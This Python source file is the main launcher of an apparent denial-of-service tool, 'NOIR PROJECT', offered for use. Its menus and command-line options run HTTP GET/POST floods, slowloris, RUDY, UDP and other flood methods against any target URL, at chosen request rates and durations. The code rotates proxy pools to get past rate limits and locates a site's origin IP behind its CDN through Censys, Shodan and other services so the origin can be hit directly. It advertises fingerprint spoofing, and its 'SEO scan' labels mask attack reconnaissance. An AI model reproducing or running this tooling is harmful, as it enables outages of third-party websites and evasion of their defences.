import os
import sys
import json
import yaml
import argparse
import asyncio
import logging
import time
import socket
from datetime import datetime

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("noir")

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

VERSION = "5.0"

def load_config(path: str = "config/default.yaml") -> dict:
    d = {
        "proxy": {"connect_timeout": 3, "min_pool": 5, "health_check_interval": 60, "max_fail": 3},
        "attack": {"default_duration": 3600, "default_method": "http_get_flood", "max_rps": 1000, "min_rps": 10, "initial_rps": 100},
    }
    try:
        with open(path) as f:
            loaded = yaml.safe_load(f)
            if loaded:
                _merge(d, loaded)
    except Exception:
        pass
    return d


def load_env(path: str = ".env") -> dict:
    env = {}
    try:
        with open(path) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#") and "=" in line:
                    key, val = line.split("=", 1)
                    env[key.strip()] = val.strip()
    except Exception:
        pass
    return env


def _merge(b: dict, o: dict):
    for k, v in o.items():
        if k in b and isinstance(b[k], dict) and isinstance(v, dict):
            _merge(b[k], v)
        else:
            b[k] = v


def c(t, s):
    codes = {"g": "32", "r": "31", "y": "33", "c": "36", "w": "37", "m": "35", "d": "90"}
    return f"\033[1;{codes.get(t, '37')}m{s}\033[0m"


def banner():
    print()
    print(c("w", "=" * 70))
    print(f"  {c('w','NOIR')} {c('r','PROJECT')} | {c('d','TOTAL RECALL ENGINE v' + VERSION + ' [2026]')}")
    print(c("w", "=" * 70))
    print()


def menu():
    banner()
    print(f"  {c('c','[1]')} SEO Scan          - Scan endpoints, CMS, WAF, sitemap")
    print(f"  {c('c','[2]')} Attack Direct     - No proxy, single IP flood")
    print(f"  {c('c','[3]')} Attack Proxy      - Rotate proxy pool (bypass rate limit)")
    print(f"  {c('c','[4]')} Attack Origin IP  - Hit origin server directly")
    print(f"  {c('c','[5]')} Test Proxies      - Validate proxy list against target")
    print(f"  {c('c','[6]')} Find Origin IP    - Discover origin IP behind CDN")
    print(f"  {c('r','[7]')} SEO BACKHEART     - Advanced SEO audit & monitoring")
    print(f"  {c('c','[0]')} Exit")
    print()


def get_input(prompt: str) -> str:
    try:
        return input(prompt).strip()
    except (EOFError, KeyboardInterrupt):
        return ""


async def run_scan(target: str, cfg: dict):
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
    print(f"\n {c('c','[*]')} Target: {c('w', target)}")
    print(f" {c('c','[*]')} Starting SEO scan...\n")

    from core.intel_engine import TargetAnalyzer
    ta = TargetAnalyzer()
    prof = ta.analyze(target)
    print(f" {c('g','[+]')} CMS: {prof.cms} | WAF: {prof.waf} | IP: {prof.ip}")
    if prof.is_behind_cdn:
        print(f" {c('y','[!]')} Behind CDN: Yes")
        if prof.origin_ips:
            print(f" {c('y','[!]')} Origin IP candidates: {prof.origin_ips[:5]}")
    else:
        print(f" {c('g','[+]')} Behind CDN: No")

    from core.endpoint_engine import SmartEndpointDiscovery
    sd = SmartEndpointDiscovery()
    endps = await sd.probe(target)
    plan = sd.generate_attack_plan()

    print(f"\n {c('c','='*70)}")
    print(f" {c('w','  SEO SCAN REPORT')}")
    print(f" {c('c','='*70)}")
    print(f"  Target:     {target}")
    print(f"  Endpoints:  {len(endps)}")
    print(f"  Vectors:    {len(plan)}")
    print(f" {c('d','-'*70)}")
    for ep in endps:
        tag = c('g','200 OK') if ep.status == 200 else (c('y',str(ep.status)) if ep.status else c('r','ERR'))
        print(f"  {tag}  {ep.method:6s} {ep.path:40s} {ep.body_len:>6}b")
    print(f" {c('d','-'*70)}")
    ok_count = sum(1 for e in endps if e.status == 200)
    block_count = sum(1 for e in endps if e.blocked)
    print(f"  Accessible:  {ok_count}/{len(endps)}")
    print(f"  Blocked:     {block_count}/{len(endps)}")
    print(f"  Sitemap:     {'/sitemap.xml' if any(e.path=='/sitemap.xml' and e.status==200 for e in endps) else 'Not found'}")
    print(f"  Robots:      {'/robots.txt' if any(e.path=='/robots.txt' and e.status==200 for e in endps) else 'Not found'}")
    wp = [e for e in endps if 'wp-' in e.path.lower()]
    print(f"  WordPress:   {len(wp)} paths detected")
    print(f" {c('c','='*70)}\n")


async def run_attack(target: str, cfg: dict, no_proxy: bool, origin_ip: str, proxy_pool=None, health_task=None, env=None):
    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    print(f"\n {c('c','[*]')} Target: {c('w', target)}")

    if origin_ip == "auto":
        from core.intel_engine import TargetAnalyzer
        from core.origin_finder import OriginFinder
        print(f" {c('c','[*]')} Auto-discovering origin IP...")
        ta = TargetAnalyzer()
        prof = ta.analyze(target)
        print(f" {c('g','[+]')} CMS: {prof.cms} | WAF: {prof.waf} | IP: {prof.ip}")

        if prof.is_behind_cdn:
            print(f" {c('y','[*]')} Running advanced origin discovery...")
            env = env or load_env()
            finder = OriginFinder()
            report = finder.find_origin(
                target,
                censys_id=env.get("CENSYS_ID") or None,
                censys_secret=env.get("CENSYS_SECRET") or None,
                shodan_key=env.get("SHODAN_KEY") or None,
                securitytrails_key=env.get("SECURITYTRAILS_KEY") or None,
                zoomeye_key=env.get("ZOOMEYE_KEY") or None,
                netlas_key=env.get("NETLAS_KEY") or None,
            )
            if report.verified_origin:
                origin_ip = report.verified_origin
                print(f" {c('g','[+]')} VERIFIED ORIGIN IP: {origin_ip}")
            elif report.candidates:
                origin_ip = report.candidates[0].ip
                print(f" {c('y','[!]')} Most likely origin: {origin_ip} ({report.candidates[0].confidence:.0%})")
                if len(report.candidates) > 1:
                    print(f" {c('y','[!]')} Other candidates: {[c.ip for c in report.candidates[1:5]]}")
            else:
                origin_ip = prof.origin_ips[0] if prof.origin_ips else None
                print(f" {c('r','[-]')} No advanced results, using basic discovery")
        elif not prof.is_behind_cdn:
            origin_ip = None
            print(f" {c('g','[+]')} No CDN detected, using direct mode.")

    if proxy_pool:
        proxy_pool._validator.set_target(target)
        alive_path = "proxies/alive.txt"
        if os.path.exists(alive_path):
            total = await proxy_pool.load_file(alive_path)
            if total == 0:
                print(f" {c('r','[-]')} alive.txt is empty. Run menu 5 first.")
                return
            print(f" {c('g','[+]')} Loaded {total} alive proxies from {alive_path}")
        else:
            total = 0
            for f in ["proxies/http.txt", "proxies/socks4.txt", "proxies/socks5.txt"]:
                total += await proxy_pool.load_file(f)
            if total == 0:
                print(f" {c('r','[-]')} No proxies loaded.")
                return
            print(f" {c('c','[*]')} Validating ALL {total} proxies against target...")
            alive = await proxy_pool.quick_validate(total, concurrency=100)
            if alive == 0:
                print(f" {c('r','[-]')} No valid proxies for this target.")
                return
            proxy_pool.save_alive(alive_path)
            print(f" {c('g','[+]')} {alive} proxies ready. Saved to {alive_path}")
        health_task = asyncio.create_task(proxy_pool.health_loop())

    print(f" {c('c','[*]')} Smart endpoint discovery...")
    from core.endpoint_engine import SmartEndpointDiscovery
    sd = SmartEndpointDiscovery()
    endps = await sd.probe(target)
    attack_plan = sd.generate_attack_plan()
    print(f" {c('g','[+]')} {len(endps)} endpoints, {len(attack_plan)} vectors")

    start_tier = 3 if origin_ip else (1 if no_proxy else 2)
    duration = int(get_input(" Duration (seconds, default 60): ") or "60")
    rps = int(get_input(" Target RPS (default 1000): ") or "1000")

    from core.attack_engine import AttackEngine
    engine = AttackEngine(
        proxy_pool=proxy_pool if not no_proxy else None,
        no_proxy=no_proxy or bool(origin_ip),
        origin_ip=origin_ip,
        proxy_type="datacenter",
        initial_rps=rps,
        start_tier=start_tier,
        attack_plan=attack_plan,
    )

    method = cfg["attack"]["default_method"]
    engine_choice = get_input(" Engine: [1] Legacy [2] Enhanced [3] v6 2026 (default 3): ").strip()
    use_v6 = engine_choice == "3" or engine_choice == ""
    use_enhanced = engine_choice == "2"
    
    if use_v6:
        print(f"\n {c('c','[*]')} v6 2026 Engine: {method} | Duration: {duration}s | RPS: {rps}")
        print(f" {c('c','[*]')} Features: JA4 spoofing, HTTP/2, Smart Session, Adaptive, Polymorphic")
        print(f" {c('m','=' * 70)}")
        
        from engines.enhanced_v6 import run_v6_attack
        proxy_url = None
        if proxy_pool and not no_proxy:
            ps = await proxy_pool.get_proxy("datacenter")
            proxy_url = ps.url if ps else None
        
        result = await run_v6_attack(
            url=target,
            duration=duration,
            method=method,
            rps=rps,
            proxy=proxy_url,
            proxy_pool=proxy_pool if not no_proxy else None,
            proxy_type="datacenter",
            origin_ip=origin_ip,
            adaptive=True,
        )
        
        elapsed = duration
        tot = result["total"]
        ok = result["completed"]
        fail = result["failed"]
        to = result["timeout"]
        adaptive_status = result.get("adaptive_status", {})
        
        print()
        print(c("w", "=" * 70))
        print(c("w", "  NOIR PROJECT v6.0 | Attack Summary"))
        print(c("w", "=" * 70))
        print(f"  Target:          {target}")
        print(f"  Duration:        {duration}s")
        print(f"  Total Requests:  {tot}")
        print(f"  {c('g','Completed:')}       {ok} ({ok/max(tot,1)*100:.1f}%)")
        print(f"  {c('r','Failed:')}          {fail} ({fail/max(tot,1)*100:.1f}%)")
        print(f"  {c('y','Timeout:')}         {to} ({to/max(tot,1)*100:.1f}%)")
        print(f"  Avg RPS:         {ok/max(elapsed,1):.1f}")
        if adaptive_status:
            print(f"  {c('c','Adaptive:')}       {adaptive_status.get('state', 'unknown')} | Strategy: {adaptive_status.get('strategy', 'unknown')}")
        print(c("w", "=" * 70))
        return
    elif use_enhanced:
        print(f"\n {c('c','[*]')} Enhanced Engine: {method} | Duration: {duration}s | RPS: {rps}")
        print(f" {c('m','=' * 70)}")
        
        from core.enhanced_attack import run_enhanced_attack
        proxy_url = None
        if proxy_pool and not no_proxy:
            ps = await proxy_pool.get_proxy("datacenter")
            proxy_url = ps.url if ps else None
        
        result = await run_enhanced_attack(
            url=target,
            duration=duration,
            method=method,
            rps=rps,
            proxy=proxy_url,
            proxy_pool=proxy_pool if not no_proxy else None,
            proxy_type="datacenter",
            origin_ip=origin_ip,
        )
        
        elapsed = duration
        tot = result["total"]
        ok = result["completed"]
        fail = result["failed"]
        to = result["timeout"]
        
        print()
        print(c("w", "=" * 70))
        print(c("w", "  NOIR PROJECT | Enhanced Attack Summary"))
        print(c("w", "=" * 70))
        print(f"  Target:          {target}")
        print(f"  Duration:        {duration}s")
        print(f"  Total Requests:  {tot}")
        print(f"  {c('g','Completed:')}       {ok} ({ok/max(tot,1)*100:.1f}%)")
        print(f"  {c('r','Failed:')}          {fail} ({fail/max(tot,1)*100:.1f}%)")
        print(f"  {c('y','Timeout:')}         {to} ({to/max(tot,1)*100:.1f}%)")
        print(f"  Avg RPS:         {ok/max(elapsed,1):.1f}")
        print(c("w", "=" * 70))
        return
    else:
        print(f"\n {c('c','[*]')} Tier: {start_tier} | Method: {method} | Duration: {duration}s | RPS: {rps}")
        print(f" {c('m','=' * 70)}")

        start = time.time()
        attack = asyncio.create_task(engine.start_attack(target, duration, method, rps))
        hb = asyncio.create_task(heartbeat(engine, duration))
        await attack
        await hb

        elapsed = time.time() - start
        m = engine.get_metrics()
        tot, ok, fail, to = m["total_requests"], m["completed"], m["failed"], m["timeout"]

        print()
        print(c("w", "=" * 70))
        print(c("w", "  NOIR PROJECT | Attack Summary"))
        print(c("w", "=" * 70))
        print(f"  Target:          {target}")
        print(f"  Duration:        {int(elapsed//60)}m {int(elapsed%60)}s")
        print(f"  Total Requests:  {tot}")
        print(f"  {c('g','Completed:')}       {ok} ({ok/max(tot,1)*100:.1f}%)")
        print(f"  {c('r','Failed:')}          {fail} ({fail/max(tot,1)*100:.1f}%)")
        print(f"  {c('y','Timeout:')}         {to} ({to/max(tot,1)*100:.1f}%)")
        print(f"  Peak RPS:        {m['peak_rps']:.1f}")
        print(f"  Avg RTT:         {m['avg_response_time_ms']:.0f}ms")
        print(f"  Tier:            {m['tier']}")
        print(f"  Method:          {method}")
        print(c("w", "=" * 70))

        os.makedirs("logs", exist_ok=True)
        log = f"logs/attack_{datetime.now():%Y%m%d_%H%M%S}.log"
        try:
            with open(log, "w") as f:
                json.dump({"target": target, "metrics": m}, f, indent=2)
            print(f" {c('g','[+]')} Log: {log}")
        except Exception:
            pass

        if health_task:
            health_task.cancel()
            try:
                await asyncio.wait_for(health_task, timeout=2.0)
            except Exception:
                pass


async def run_proxy_test(target: str, cfg: dict):
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
    from core.proxy_engine import ProxyPool
    p = ProxyPool(connect_timeout=5)
    p._validator.max_connect_time_ms = 5000
    p._validator.set_target(target)
    total = 0
    for f in ["proxies/http.txt", "proxies/socks4.txt", "proxies/socks5.txt"]:
        total += await p.load_file(f)
    print(f"\n {c('c','[*]')} Target: {c('w', target)}")
    print(f" {c('c','[*]')} Loaded: {total} proxies")
    print(f" {c('c','[*]')} Validating ALL against {target}...\n")
    alive = await p.quick_validate(total, concurrency=100)
    stats = p.stats()
    p.save_alive("proxies/alive.txt")
    print(f" {c('c','='*70)}")
    print(f" {c('w','  PROXY TEST RESULTS')}")
    print(f" {c('c','='*70)}")
    print(f"  Total:     {total}")
    print(f"  Alive:     {stats['total']}")
    print(f"  Dead:      {stats['dead']} (removed)")
    print(f" {c('d','-'*70)}")
    if stats["total"] > 0:
        for tier, pool in p._pools.items():
            for ps in pool:
                print(f"  [{tier:12s}] {ps.url:45s} {ps.connect_time_ms:.0f}ms")
    print(f" {c('d','-'*70)}")
    print(f"  {c('g','[+]')} Alive proxies saved to: proxies/alive.txt")
    print(f"  {c('g','[+]')} Attack menus will auto-use alive proxies.")
    print(f" {c('c','='*70)}\n")


async def run_find_origin(target: str, env: dict = None):
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
    from core.intel_engine import TargetAnalyzer
    from core.origin_finder import OriginFinder
    ta = TargetAnalyzer()
    print(f"\n {c('c','[*]')} Analyzing: {c('w', target)}")
    prof = ta.analyze(target)
    print(f"\n {c('c','='*70)}")
    print(f" {c('w','  ORIGIN IP REPORT')}")
    print(f" {c('c','='*70)}")
    print(f"  Target:     {target}")
    print(f"  CMS:        {prof.cms}")
    print(f"  WAF:        {prof.waf}")
    print(f"  CDN:        {'Yes' if prof.is_behind_cdn else 'No'}")
    print(f"  CF IP:      {prof.ip}")

    env = env or load_env()
    zoomeye_key = env.get("ZOOMEYE_KEY", "")
    netlas_key = env.get("NETLAS_KEY", "")
    censys_id = env.get("CENSYS_ID", "")
    censys_secret = env.get("CENSYS_SECRET", "")
    shodan_key = env.get("SHODAN_KEY", "")
    securitytrails_key = env.get("SECURITYTRAILS_KEY", "")

    api_status = []
    if zoomeye_key: api_status.append("ZoomEye")
    if netlas_key: api_status.append("Netlas")
    if censys_id: api_status.append("Censys")
    if shodan_key: api_status.append("Shodan")
    if securitytrails_key: api_status.append("SecurityTrails")

    if api_status:
        print(f" {c('g','[*]')} API Keys Active: {', '.join(api_status)}")
    else:
        print(f" {c('y','[*]')} No API keys loaded. Add keys to .env for better results.")

    print(f"\n {c('y','[*]')} Running advanced origin discovery...")
    print(f" {c('d','[*]')} Note: Active outbound trigger (webhook.site) runs last - takes ~15s")
    finder = OriginFinder()
    report = finder.find_origin(
        target,
        censys_id=censys_id or None,
        censys_secret=censys_secret or None,
        shodan_key=shodan_key or None,
        securitytrails_key=securitytrails_key or None,
        zoomeye_key=zoomeye_key or None,
        netlas_key=netlas_key or None,
    )

    print(f" {c('d','-'*70)}")
    print(f"  Techniques Used: {report.techniques_used}")
    print(f"  Candidates Found: {len(report.candidates)}")

    if report.candidates:
        print(f" {c('d','-'*70)}")
        print(f"  {c('y','ORIGIN IP CANDIDATES:')}")
        for i, cand in enumerate(report.candidates[:10], 1):
            verified = " [VERIFIED]" if cand.verified else ""
            print(f"  {i}. {c('g' if cand.verified else 'w', cand.ip):20s} {cand.confidence:.0%} {cand.source}{verified}")
            if cand.details:
                print(f"     {c('d', cand.details)}")

    if report.verified_origin:
        print(f" {c('g','='*70)}")
        print(f"  {c('g','[+]')} VERIFIED ORIGIN IP: {c('g', report.verified_origin)}")
        print(f" {c('g','='*70)}")
    elif report.candidates:
        best = report.candidates[0]
        print(f" {c('y','='*70)}")
        print(f"  {c('y','[!]')} MOST LIKELY ORIGIN: {c('y', best.ip)} ({best.confidence:.0%})")
        print(f" {c('y','='*70)}")
    else:
        print(f" {c('r','='*70)}")
        print(f"  {c('r','[-]')} No origin IP found via passive techniques.")
        print(f"  {c('y','[*]')} Try these next steps:")
        print(f"    1. Use API keys: --censys-id, --censys-secret, --shodan-key")
        print(f"    2. Check email headers from target's contact form")
        print(f"    3. Search Shodan/Censys manually for favicon hash")
        print(f"    4. Try subdomain brute force with larger wordlist")
        print(f" {c('r','='*70)}")

    print(f" {c('c','='*70)}\n")


async def run_seo_backheart(target: str, cfg: dict):
    if not target.startswith(("http://", "https://")):
        target = "https://" + target
    print(f"\n {c('c','[*]')} Target: {c('w', target)}")
    print(f" {c('c','[*]')} SEO Backheart mode is limited to SAFE SEO audit & monitoring.\n")

    from core.intel_engine import TargetAnalyzer
    ta = TargetAnalyzer()
    prof = ta.analyze(target)
    print(f" {c('g','[+]')} CMS: {prof.cms} | WAF: {prof.waf} | IP: {prof.ip}")

    from core.seo.backheart import SEOTarget, SEOBackheart
    audit = SEOBackheart(SEOTarget(url=target, keywords=[], niche="", competitors=[]))
    report = await audit.run()

    print(f"\n {c('c','='*70)}")
    print(f" {c('w','  SEO BACKHEART AUDIT REPORT')}")
    print(f" {c('c','='*70)}")
    print(f"  Target:     {report.get('target','')}")
    print(f"  Robots:     {report.get('robots_status',0)} | Sitemap URLs: {report.get('sitemap_discovered_urls',0)}")
    print(f" {c('d','-'*70)}")
    for p in report.get('pages', []):
        issues = p.get('issues', [])
        issue_str = ", ".join(issues[:4]) if issues else "OK"
        title = p.get('title', '')
        if len(title) > 50:
            title = title[:50] + "..."
        print(f"  {c('g',str(p.get('status',0)))}  {p.get('url','')}")
        print(f"     title: {title}")
        print(f"     meta_desc_len: {p.get('meta_description_len',0)} | h1: {p.get('h1_count',0)} | in/out: {p.get('internal_links',0)}/{p.get('external_links',0)}")
        print(f"     issues: {issue_str}")
    print(f" {c('c','='*70)}\n")


async def heartbeat(engine, dur: float):
    start = time.time()
    while time.time() - start < dur + 2:
        await asyncio.sleep(2)
        m = engine.get_metrics()
        line = "  %s %s %s RPS:%s Tier:%d RTT:%.0fms Proxies:%d     " % (
            c('c', 'Req:' + str(m['total_requests'])),
            c('g', 'OK:' + str(m['completed'])),
            c('r', 'FAIL:' + str(m['failed'])) + ' ' + c('y', 'TO:' + str(m['timeout'])),
            c('w', '%.1f' % m['current_rps']),
            m['tier'], m['avg_response_time_ms'], m['active_proxies'])
        print('\r' + line, end="", flush=True)
    print()


async def cmd_menu(cfg):
    env = load_env()
    while True:
        menu()
        choice = get_input(" Select option: ")
        if choice == "0":
            print(f"\n {c('y','[!]')} Exit.")
            return
        elif choice == "1":
            target = get_input(" Target URL: ")
            if not target:
                continue
            await run_scan(target, cfg)
            get_input(" Press Enter to continue...")
        elif choice == "2":
            target = get_input(" Target URL: ")
            if not target:
                continue
            await run_attack(target, cfg, no_proxy=True, origin_ip=None, env=env)
            get_input(" Press Enter to continue...")
        elif choice == "3":
            target = get_input(" Target URL: ")
            if not target:
                continue
            from core.proxy_engine import ProxyPool
            proxy_pool = ProxyPool(connect_timeout=5, min_pool=cfg["proxy"]["min_pool"])
            await run_attack(target, cfg, no_proxy=False, origin_ip=None, proxy_pool=proxy_pool, env=env)
            get_input(" Press Enter to continue...")
        elif choice == "4":
            target = get_input(" Target URL: ")
            if not target:
                continue
            await run_attack(target, cfg, no_proxy=False, origin_ip="auto", env=env)
            get_input(" Press Enter to continue...")
        elif choice == "5":
            target = get_input(" Target URL: ")
            if not target:
                continue
            await run_proxy_test(target, cfg)
            get_input(" Press Enter to continue...")
        elif choice == "6":
            target = get_input(" Target URL: ")
            if not target:
                continue
            await run_find_origin(target, env)
            get_input(" Press Enter to continue...")
        elif choice == "7":
            target = get_input(" Target URL: ")
            if not target:
                continue
            await run_seo_backheart(target, cfg)
            get_input(" Press Enter to continue...")
        else:
            print(f" {c('r','[-]')} Invalid option.")


async def main():
    p = argparse.ArgumentParser(description="NOIR PROJECT v5.0 [2026]")
    p.add_argument("--start", action="store_true", help="Interactive menu mode")
    p.add_argument("--target", "-t", default="")
    p.add_argument("--method", "-m", default="", choices=["http_get_flood", "http_post_flood", "bypass_path_flood", "browser", "dynamic", "slow", "pps", "slowloris", "rudy", "udp_flood", "websocket", "graphql", "http3"])
    p.add_argument("--v6", action="store_true", help="Use v6 enhanced engine with 2026 evasion techniques")
    p.add_argument("--adaptive", action="store_true", help="Enable adaptive mode (auto-switch methods)")
    p.add_argument("--duration", "-d", type=int, default=0)
    p.add_argument("--rps", "-r", type=int, default=0)
    p.add_argument("--tier", type=int, default=0, choices=[0, 1, 2, 3])
    p.add_argument("--no-proxy", action="store_true", help="Direct attack without proxies")
    p.add_argument("--origin-ip", nargs="?", const="auto", default=None)
    p.add_argument("--proxy-type", choices=["mobile", "residential", "ipv6", "datacenter"], default="mobile")
    p.add_argument("--smart", action="store_true", help="Smart endpoint discovery + rotation")
    p.add_argument("--scan-only", action="store_true", help="Scan endpoints only, no attack (SEO mode)")
    p.add_argument("--config", "-c", default="config/default.yaml")
    args = p.parse_args()

    cfg = load_config(args.config)

    if args.start:
        await cmd_menu(cfg)
        return

    if args.target:
        await cmd_start(args, cfg)
    else:
        banner()
        print(f"  {c('r','Error:')} No target specified.")
        print(f"  Use --start for interactive menu, or -t TARGET for direct mode.\n")


async def cmd_start(args, cfg):
    target = args.target
    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    print("=" * 70)
    print("  \033[1;37mNOIR\033[0m \033[1;31mPROJECT\033[0m | \033[1;90mTOTAL RECALL ENGINE v5.0 [2026]\033[0m")
    print("=" * 70)
    print(f" {c('c','[*]')} Target: {c('w',target)}")

    env = load_env()
    origin_ip = args.origin_ip
    if origin_ip == "auto":
        from core.intel_engine import TargetAnalyzer
        from core.origin_finder import OriginFinder
        print(f" {c('c','[*]')} Auto-discovering origin IP...")
        ta = TargetAnalyzer()
        prof = ta.analyze(target)
        print(f" {c('g','[+]')} CMS: {prof.cms} | WAF: {prof.waf} | IP: {prof.ip}")

        if prof.is_behind_cdn:
            print(f" {c('y','[*]')} Running advanced origin discovery...")
            finder = OriginFinder()
            report = finder.find_origin(
                target,
                censys_id=env.get("CENSYS_ID") or None,
                censys_secret=env.get("CENSYS_SECRET") or None,
                shodan_key=env.get("SHODAN_KEY") or None,
                securitytrails_key=env.get("SECURITYTRAILS_KEY") or None,
                zoomeye_key=env.get("ZOOMEYE_KEY") or None,
                netlas_key=env.get("NETLAS_KEY") or None,
            )
            if report.verified_origin:
                origin_ip = report.verified_origin
                print(f" {c('g','[+]')} VERIFIED ORIGIN IP: {origin_ip}")
            elif report.candidates:
                origin_ip = report.candidates[0].ip
                print(f" {c('y','[!]')} Most likely origin: {origin_ip} ({report.candidates[0].confidence:.0%})")
                if len(report.candidates) > 1:
                    print(f" {c('y','[!]')} Other candidates: {[c.ip for c in report.candidates[1:5]]}")
            else:
                origin_ip = prof.origin_ips[0] if prof.origin_ips else None
                print(f" {c('r','[-]')} No advanced results, using basic discovery")
        elif not prof.is_behind_cdn:
            origin_ip = None
            print(f" {c('g','[+]')} No CDN detected, using direct mode.")

    proxy_pool = None
    health_task = None
    bg_task = None

    if args.scan_only:
        print(f" {c('g','[+]')} Scan-only mode: no proxies needed.")
    elif args.no_proxy or origin_ip:
        print(f" {c('g','[+]')} Direct mode: no proxies needed.")
    else:
        from core.proxy_engine import ProxyPool
        proxy_pool = ProxyPool(connect_timeout=5,
                                min_pool=cfg["proxy"]["min_pool"])
        proxy_pool._validator.max_connect_time_ms = 5000
        alive_path = "proxies/alive.txt"
        if os.path.exists(alive_path):
            total = await proxy_pool.load_file(alive_path)
            if total == 0:
                print(f" {c('r','[-]')} alive.txt empty. Run with --scan-only first or delete it.")
                return
            print(f" {c('g','[+]')} Loaded {total} alive proxies from {alive_path}")
        else:
            total = 0
            for f in ["proxies/http.txt", "proxies/socks4.txt", "proxies/socks5.txt"]:
                total += await proxy_pool.load_file(f)
            jpath = "config/proxies.json"
            if os.path.exists(jpath):
                try:
                    with open(jpath) as f:
                        total += await proxy_pool.load(json.load(f))
                except Exception:
                    pass
            if total == 0:
                print(f" {c('r','[-]')} No proxies. Use --no-proxy.")
                return
            proxy_pool._validator.set_target(target)
            print(f" {c('c','[*]')} Validating ALL {total} proxies against target...")
            alive = await proxy_pool.quick_validate(total, concurrency=100)
            if alive == 0:
                print(f" {c('r','[-]')} No valid proxies. Use --no-proxy or --origin-ip.")
                return
            proxy_pool.save_alive(alive_path)
            print(f" {c('g','[+]')} {alive} proxies ready. Saved to {alive_path}")
        health_task = asyncio.create_task(proxy_pool.health_loop())
        bg_task = None

    proxy_type = args.proxy_type or "mobile"
    start_tier = args.tier or (3 if origin_ip else (2 if proxy_pool else 1))

    if args.scan_only:
        args.smart = True

    attack_plan = None
    if args.smart:
        from core.endpoint_engine import SmartEndpointDiscovery
        print(f" {c('c','[*]')} Smart endpoint discovery...")
        sd = SmartEndpointDiscovery()
        endps = await sd.probe(target)
        attack_plan = sd.generate_attack_plan()
        print(f" {c('g','[+]')} {len(endps)} endpoints found, {len(attack_plan)} attack vectors")
        for ep in endps[:6]:
            tag = c('r','BLOCK') if ep.blocked else c('g','OK')
            print(f"     {ep.method:6s} {ep.path:30s} {ep.status} {tag} {ep.body_len}b")
        if len(endps) > 6:
            print(f"     ... and {len(endps)-6} more")

    if args.scan_only:
        from core.endpoint_engine import SmartEndpointDiscovery
        print(f"\n {c('c','='*70)}")
        print(f" {c('w','  SEO SCAN REPORT')}")
        print(f" {c('c','='*70)}")
        print(f"  Target:  {target}")
        print(f"  Scanned: {len(endps)} endpoints")
        print(f" {c('d','-'*70)}")
        for ep in endps:
            tag = c('g','200 OK') if ep.status == 200 else (c('y',str(ep.status)) if ep.status else c('r','ERR'))
            print(f"  {tag}  {ep.method:6s} {ep.path:40s} {ep.body_len:>6}b")
        print(f" {c('d','-'*70)}")
        ok_count = sum(1 for e in endps if e.status == 200)
        block_count = sum(1 for e in endps if e.blocked)
        print(f"  Accessible:  {ok_count}/{len(endps)}")
        print(f"  Blocked:     {block_count}/{len(endps)}")
        print(f"  Sitemap:     {'/sitemap.xml' if any(e.path=='/sitemap.xml' and e.status==200 for e in endps) else 'Not found'}")
        print(f"  Robots:      {'/robots.txt' if any(e.path=='/robots.txt' and e.status==200 for e in endps) else 'Not found'}")
        wp = [e for e in endps if 'wp-' in e.path.lower()]
        print(f"  WordPress:   {len(wp)} paths detected")
        print(f" {c('c','='*70)}")
        return

    from core.attack_engine import AttackEngine
    engine = AttackEngine(
        proxy_pool=proxy_pool,
        no_proxy=args.no_proxy or bool(origin_ip),
        origin_ip=origin_ip,
        proxy_type=proxy_type,
        initial_rps=args.rps or cfg["attack"]["initial_rps"],
        start_tier=start_tier,
        attack_plan=attack_plan,
    )

    method = args.method or cfg["attack"]["default_method"]
    duration = args.duration or cfg["attack"]["default_duration"]

    print(f" {c('c','[*]')} Tier: {start_tier} | Method: {method} | Duration: {duration}s | RPS: {args.rps or cfg['attack']['initial_rps']}")
    print(f" {c('m','=' * 70)}")

    start = time.time()
    attack = asyncio.create_task(engine.start_attack(target, duration, method, args.rps or cfg["attack"]["initial_rps"]))
    hb = asyncio.create_task(heartbeat(engine, duration))
    await attack
    await hb

    elapsed = time.time() - start
    m = engine.get_metrics()
    tot, ok, fail, to = m["total_requests"], m["completed"], m["failed"], m["timeout"]

    print()
    print(c("w", "=" * 70))
    print(c("w", "  NOIR PROJECT | Attack Summary"))
    print(c("w", "=" * 70))
    print(f"  Target:          {target}")
    print(f"  Duration:        {int(elapsed//60)}m {int(elapsed%60)}s")
    print(f"  Total Requests:  {tot}")
    print(f"  {c('g','Completed:')}       {ok} ({ok/max(tot,1)*100:.1f}%)")
    print(f"  {c('r','Failed:')}          {fail} ({fail/max(tot,1)*100:.1f}%)")
    print(f"  {c('y','Timeout:')}         {to} ({to/max(tot,1)*100:.1f}%)")
    print(f"  Peak RPS:        {m['peak_rps']:.1f}")
    print(f"  Avg RTT:         {m['avg_response_time_ms']:.0f}ms")
    print(f"  Tier:            {m['tier']}")
    print(f"  Method:          {method}")
    print(c("w", "=" * 70))

    log = f"logs/attack_{datetime.now():%Y%m%d_%H%M%S}.log"
    try:
        with open(log, "w") as f:
            json.dump({"target": target, "metrics": m}, f, indent=2)
        print(f" {c('g','[+]')} Log: {log}")
    except Exception:
        pass

    if health_task:
        health_task.cancel()
    if bg_task:
        bg_task.cancel()
    for t in [health_task, bg_task]:
        if t:
            try:
                await asyncio.wait_for(t, timeout=2.0)
            except (asyncio.CancelledError, asyncio.TimeoutError, Exception):
                pass


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n {c('y','[!]')} Cancelled.")
        sys.exit(0)
    except Exception as e:
        logger.error("Fatal: %s", str(e), exc_info=True)
        sys.exit(1)
